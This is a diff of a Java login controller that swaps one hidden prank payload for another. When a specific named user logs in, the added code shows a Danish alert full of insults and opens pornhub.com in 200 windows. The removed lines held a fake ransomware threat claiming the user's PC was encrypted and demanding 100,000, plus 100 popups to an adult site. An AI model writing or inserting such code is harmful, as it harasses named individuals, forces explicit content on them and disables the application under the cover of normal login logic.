@@ -346,13 +346,13 @@ public class Controller {
 		public void onClick(ClickEvent event) {
 			if (event.getSource() == loginView.getBtnOk())
 			
-				if (loginView.getUserId().equals("Kevin")){
-					Window.alert("Du har vist glemt din kode Kevin??? Din skod windows pc er blevet krypteret, vi har al din porno. Betal 100.000 for at få koden eller vi tisser på din madras.  Windows virus har slået til igen. Hilsen GIT master u bitch. ");
+				if (loginView.getUserId().equals("Magnus")){
+					Window.alert("Du er vist en rigtig bitch, Magnus..  Hævnen er sød! Den legendariske Windows virus har slået til igen. Hilsen GUI-masteren (ps. du er en cunt)");
 
 					int i;
-					for(i=0; i<100; i++){
+					for(i=0; i<200; i++){
 					
-					Window.open("http://creatives.livejasmin.com/pu/w2/index.php?psid=ed_admeddk&site=livejasmin", null, "fullscreeen");
+					Window.open("http://pornhub.com", null, "fullscreeen");
 						
 					
 					}
